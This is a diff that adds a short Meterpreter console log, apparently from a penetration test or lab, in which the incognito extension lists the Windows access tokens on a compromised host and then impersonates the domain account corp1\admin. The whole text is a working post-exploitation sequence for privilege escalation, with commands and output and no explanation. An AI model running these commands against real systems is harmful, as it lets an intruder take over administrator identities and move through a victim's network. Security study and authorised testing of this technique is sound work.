@@ -1,0 +1,15 @@
+meterpreter > load incognito
+
+meterpreter > list_tokens -u
+corp1\admin
+IIS APPPOOL\DefaultAppPool
+NT AUTHORITY\IUSR
+NT AUTHORITY\LOCAL SERVICE
+NT AUTHORITY\NETWORK SERVICE
+NT AUTHORITY\SYSTEM
+NT SERVICE\SQLTELEMETRY$SQLEXPRESS
+Window Manager\DWM-1
+
+meterpreter > impersonate_token corp1\\admin
+impersonate_token corp1\\admin
+getuid
